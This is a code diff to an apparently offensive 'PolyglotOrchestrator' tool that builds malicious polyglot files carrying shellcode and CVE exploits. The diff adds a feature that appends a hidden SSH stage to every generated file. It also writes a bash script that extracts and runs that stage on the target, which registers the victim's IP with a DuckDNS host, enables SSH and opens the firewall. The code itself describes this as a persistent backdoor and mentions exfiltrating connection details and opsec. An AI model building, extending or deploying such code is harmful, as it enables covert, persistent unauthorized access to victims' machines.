@@ -69,6 +69,11 @@ class PolyglotOrchestrator:
         # Campaign directory (named after operation ID)
         self.campaign_dir = self._init_campaign_directory()
 
+        # Remote access configuration (for embedding SSH script in polyglots)
+        self.remote_access_enabled = False
+        self.ssh_port = None
+        self.ssh_script_content = None
+
     def _init_campaign_directory(self) -> str:
         """
         Initialize campaign directory for artifacts
@@ -113,6 +118,9 @@ class PolyglotOrchestrator:
         self.tui.info(f"Started: {self.operation_start.strftime('%Y-%m-%d %H:%M:%S')}")
         print()
 
+        # Prompt for remote access BEFORE workflow selection
+        self._prompt_remote_access_setup()
+
         # Smart workflow menu
         workflow = self._select_smart_workflow()
 
@@ -139,6 +147,193 @@ class PolyglotOrchestrator:
 
         # Show operation summary
         self._show_operation_summary()
+
+    def _prompt_remote_access_setup(self):
+        """
+        Prompt for remote access setup BEFORE workflow execution
+
+        Asks user if they want to embed SSH remote access capability in polyglots.
+        If enabled:
+        - Generates random SSH port (2000-65000)
+        - Displays port prominently
+        - Reads target_duckdns_setup.py content for embedding
+        - Stores configuration for later use during polyglot generation
+        """
+        self.tui.section("🔐 Remote Access Configuration")
+
+        self.tui.info("Embed remote SSH access script IN polyglots?")
+        self.tui.list_item("SSH script will be embedded as final stage in polyglot file", level=1)
+        self.tui.list_item("Target runs polyglot → registers IP with DuckDNS → enables SSH", level=1)
+        self.tui.list_item("Provides persistent backdoor access to compromised target", level=1)
+        print()
+
+        if self.menu.confirm("Enable embedded remote access?", default=False):
+            try:
+                import pathlib
+                import random
+
+                # Generate random SSH port
+                self.ssh_port = random.randint(2000, 65000)
+
+                # Read SSH script content
+                ssh_script_path = pathlib.Path(__file__).parent / "target_duckdns_setup.py"
+                with open(ssh_script_path, 'r') as f:
+                    self.ssh_script_content = f.read()
+
+                # Update port in script content
+                self.ssh_script_content = self.ssh_script_content.replace(
+                    'ssh_port = generate_random_port()',
+                    f'ssh_port = {self.ssh_port}  # Pre-configured port'
+                )
+
+                # Enable remote access
+                self.remote_access_enabled = True
+
+                # Display configuration prominently
+                print()
+                self.tui.box("✅ REMOTE ACCESS ENABLED", [
+                    "",
+                    f"🔌 SSH PORT: {self.ssh_port}",
+                    "",
+                    "The target_duckdns_setup.py script will be embedded as a final",
+                    "stage in all generated polyglots. When executed on the target:",
+                    "",
+                    "  1. Target detects its public IP",
+                    f"  2. Registers with polygottem.duckdns.org",
+                    f"  3. Enables SSH server on port {self.ssh_port}",
+                    "  4. Configures firewall to allow access",
+                    "  5. Saves connection info to /tmp/.polygottem_target_info.json",
+                    "",
+                    f"Connect to target with: ssh -p {self.ssh_port} user@polygottem.duckdns.org",
+                    ""
+                ])
+                print()
+
+                self.tui.warning(f"⚠ REMEMBER: SSH Port {self.ssh_port} will be used for all targets in this campaign")
+                print()
+
+            except Exception as e:
+                self.tui.error(f"Failed to configure remote access: {e}")
+                self.remote_access_enabled = False
+                self.ssh_port = None
+                self.ssh_script_content = None
+        else:
+            self.tui.info("Remote access disabled - polyglots will not include SSH backdoor")
+            print()
+
+    def _embed_ssh_stage_in_polyglot(self, polyglot_path: str) -> bool:
+        """
+        Embed SSH remote access script as final stage in polyglot
+
+        Args:
+            polyglot_path: Path to polyglot file to modify
+
+        Returns:
+            True if SSH stage was embedded, False if remote access disabled
+
+        The SSH script is embedded with a unique marker for extraction:
+        - Marker: b'SSH_STAGE_BEGIN_0xDEADBEEF'
+        - Content: Python script (target_duckdns_setup.py)
+        - Marker: b'SSH_STAGE_END_0xDEADBEEF'
+        """
+        if not self.remote_access_enabled or not self.ssh_script_content:
+            return False
+
+        try:
+            import pathlib
+
+            # Read existing polyglot
+            with open(polyglot_path, 'rb') as f:
+                polyglot_data = f.read()
+
+            # Create SSH stage with markers
+            ssh_stage = b'SSH_STAGE_BEGIN_0xDEADBEEF\n'
+            ssh_stage += self.ssh_script_content.encode('utf-8')
+            ssh_stage += b'\nSSH_STAGE_END_0xDEADBEEF'
+
+            # Append SSH stage to polyglot
+            with open(polyglot_path, 'wb') as f:
+                f.write(polyglot_data)
+                f.write(b'\n\n')  # Add spacing
+                f.write(ssh_stage)
+
+            # Create extraction script for SSH stage (macOS/Linux compatible)
+            extraction_script = f'''#!/usr/bin/env bash
+# Extract and execute SSH setup stage from polyglot
+# macOS and Linux compatible
+POLYGLOT="{os.path.basename(polyglot_path)}"
+TARGET_SCRIPT="/tmp/target_setup_$$.py"
+
+# Detect Python (python3 or python)
+if command -v python3 &>/dev/null; then
+    PYTHON=python3
+elif command -v python &>/dev/null; then
+    PYTHON=python
+else
+    echo "[-] Python not found"
+    exit 1
+fi
+
+# Extract SSH stage
+$PYTHON << 'EXTRACT_EOF'
+import sys
+
+try:
+    with open("{os.path.basename(polyglot_path)}", "rb") as f:
+        data = f.read()
+
+    # Find SSH stage markers
+    begin_marker = b'SSH_STAGE_BEGIN_0xDEADBEEF'
+    end_marker = b'SSH_STAGE_END_0xDEADBEEF'
+
+    begin_pos = data.find(begin_marker)
+    end_pos = data.find(end_marker)
+
+    if begin_pos != -1 and end_pos != -1:
+        # Extract content between markers
+        ssh_content = data[begin_pos + len(begin_marker) + 1:end_pos]
+        with open("/tmp/target_setup_" + str(sys.argv[1] if len(sys.argv) > 1 else "$$") + ".py", "wb") as f:
+            f.write(ssh_content)
+        print("[+] SSH stage extracted successfully")
+        sys.exit(0)
+    else:
+        print("[-] SSH stage markers not found in polyglot")
+        sys.exit(1)
+except Exception as e:
+    print(f"[-] Extraction error: {{e}}")
+    sys.exit(1)
+EXTRACT_EOF
+
+if [ $? -eq 0 ]; then
+    chmod +x "$TARGET_SCRIPT"
+    echo "[*] Executing SSH setup on target..."
+    echo "[*] Platform: $(uname -s)"
+    $PYTHON "$TARGET_SCRIPT"
+
+    # Cleanup
+    rm -f "$TARGET_SCRIPT" 2>/dev/null
+else
+    echo "[-] Extraction failed"
+    exit 1
+fi
+'''
+
+            # Save extraction script
+            extract_script_path = self._campaign_path(f"extract_ssh_{os.path.basename(polyglot_path)}.sh")
+            with open(extract_script_path, 'w') as f:
+                f.write(extraction_script)
+
+            os.chmod(extract_script_path, 0o755)
+            self.artifacts.append(extract_script_path)
+
+            self.tui.success(f"✓ SSH stage embedded in {os.path.basename(polyglot_path)} (Port: {self.ssh_port})")
+            self.tui.list_item(f"Extraction script: {os.path.basename(extract_script_path)}", level=1)
+
+            return True
+
+        except Exception as e:
+            self.tui.error(f"Failed to embed SSH stage: {e}")
+            return False
 
     def _select_smart_workflow(self) -> int:
         """Select smart workflow preset"""
@@ -329,6 +524,9 @@ class PolyglotOrchestrator:
             self.artifacts.append(output_file)
             self.tui.success(f"Generated: {output_file}")
 
+            # Embed SSH remote access stage if enabled
+            self._embed_ssh_stage_in_polyglot(output_file)
+
             # Apply OpSec
             if self.menu.confirm("Apply operational security?", default=True):
                 self._apply_opsec(output_file)
@@ -435,6 +633,9 @@ class PolyglotOrchestrator:
             self.polyglot_gen.create_apt41_cascading_polyglot(shellcode, output_file, custom_png_path)
             self.artifacts.append(output_file)
             self.tui.success(f"Generated: {output_file}")
+
+            # Embed SSH remote access stage if enabled
+            self._embed_ssh_stage_in_polyglot(output_file)
 
             # Show stats
             size_mb = os.path.getsize(output_file) / (1024 * 1024)
@@ -1397,6 +1598,9 @@ sudo /usr/local/bin/cpu_desync_macos
             size_mb = os.path.getsize(output_file) / (1024 * 1024)
             self.tui.success(f"Generated polyglot: {output_file} ({size_mb:.2f} MB)")
 
+            # Embed SSH remote access stage if enabled
+            self._embed_ssh_stage_in_polyglot(output_file)
+
             # Show what's inside
             self.tui.info(f"Polyglot contains: {cve_id}")
 
@@ -1438,6 +1642,9 @@ sudo /usr/local/bin/cpu_desync_macos
             self.artifacts.append(output_file)
             size_mb = os.path.getsize(output_file) / (1024 * 1024)
             self.tui.success(f"Generated polyglot: {output_file} ({size_mb:.2f} MB)")
+
+            # Embed SSH remote access stage if enabled
+            self._embed_ssh_stage_in_polyglot(output_file)
 
             # Show what's inside
             self.tui.info("Polyglot contains:")
@@ -1493,65 +1700,64 @@ sudo /usr/local/bin/cpu_desync_macos
         self.tui.success(f"✓ Operation {self.operation_id} complete!")
 
     def _offer_duckdns_registration(self):
-        """Offer DuckDNS registration and SSH setup"""
+        """Show summary of embedded SSH remote access (if enabled)"""
         print()
         print()
-        self.tui.section("🌐 Remote Access Setup")
 
-        self.tui.info("Generate post-exploitation script for TARGET?")
-        self.tui.list_item("Deploy script to compromised target", level=1)
-        self.tui.list_item("Target registers its IP with DuckDNS", level=1)
-        self.tui.list_item("Target enables SSH server", level=1)
-        self.tui.list_item("Receive connection information", level=1)
-        print()
+        if self.remote_access_enabled:
+            # Show summary of embedded remote access
+            self.tui.section("🌐 Remote Access Summary")
 
-        if self.menu.confirm("Generate target remote access script?", default=False):
-            try:
-                import shutil
-                import pathlib
+            self.tui.box("✅ SSH BACKDOOR EMBEDDED", [
+                "",
+                f"SSH Port: {self.ssh_port}",
+                "Domain: polygottem.duckdns.org",
+                "",
+                "The target_duckdns_setup.py script has been embedded in all polyglots.",
+                "When the polyglot is executed on the target:",
+                "",
+                "  1. Extracts SSH setup stage from polyglot",
+                "  2. Target detects its public IP",
+                "  3. Registers with polygottem.duckdns.org",
+                f"  4. Enables SSH server on port {self.ssh_port}",
+                "  5. Configures firewall to allow remote access",
+                "  6. Saves connection info to /tmp/.polygottem_target_info.json",
+                "",
+                f"Connect with: ssh -p {self.ssh_port} user@polygottem.duckdns.org",
+                ""
+            ])
+            print()
 
-                # Copy target DuckDNS setup script to campaign directory
-                source_script = pathlib.Path(__file__).parent / "target_duckdns_setup.py"
-                dest_script = pathlib.Path(self.campaign_dir) / "target_duckdns_setup.py"
+            # Offer to generate standalone script as well
+            if self.menu.confirm("Also generate standalone SSH setup script?", default=False):
+                try:
+                    import shutil
+                    import pathlib
 
-                shutil.copy2(source_script, dest_script)
+                    # Copy target DuckDNS setup script to campaign directory
+                    source_script = pathlib.Path(__file__).parent / "target_duckdns_setup.py"
+                    dest_script = pathlib.Path(self.campaign_dir) / "target_duckdns_setup.py"
 
-                # Make it executable
-                os.chmod(dest_script, 0o755)
+                    shutil.copy2(source_script, dest_script)
 
-                # Track artifact
-                self.artifacts.append(str(dest_script))
+                    # Make it executable
+                    os.chmod(dest_script, 0o755)
 
-                print()
-                self.tui.success(f"✓ Target script generated: {dest_script}")
-                print()
+                    # Track artifact
+                    self.artifacts.append(str(dest_script))
 
-                # Show deployment instructions
-                self.tui.section("📋 Deployment Instructions")
-                self.tui.info("After initial exploitation, deploy this script to the TARGET:")
-                print()
-                self.tui.key_value("Script Location", str(dest_script), 20)
-                print()
-                self.tui.info("On TARGET, run:")
-                self.tui.list_item(f"python3 target_duckdns_setup.py", level=1)
-                self.tui.list_item("or", level=1)
-                self.tui.list_item(f"chmod +x target_duckdns_setup.py && ./target_duckdns_setup.py", level=1)
-                print()
-                self.tui.info("The script will:")
-                self.tui.list_item("Detect target's public IP", level=1)
-                self.tui.list_item("Register with DuckDNS (polygottem.duckdns.org)", level=1)
-                self.tui.list_item("Enable SSH server on target", level=1)
-                self.tui.list_item("Configure firewall on target", level=1)
-                self.tui.list_item("Save connection info to /tmp/.polygottem_target_info.json", level=1)
-                print()
-                self.tui.warning("⚠ OPSEC: Exfiltrate /tmp/.polygottem_target_info.json from target to get SSH connection details")
-                print()
+                    print()
+                    self.tui.success(f"✓ Standalone script saved: {dest_script}")
+                    print()
 
-            except Exception as e:
-                self.tui.error(f"Failed to generate target script: {e}")
-                self.tui.info("Script location: tools/target_duckdns_setup.py")
+                except Exception as e:
+                    self.tui.error(f"Failed to generate standalone script: {e}")
         else:
-            self.tui.info("Skipping remote access setup")
+            # Remote access was not enabled
+            self.tui.section("🌐 Remote Access")
+            self.tui.info("Remote access was not enabled for this operation")
+            self.tui.list_item("To enable: Answer 'Yes' when prompted at start", level=1)
+            print()
 
     def _prompt_cve_selection(self) -> Optional[str]:
         """Prompt for single CVE selection"""
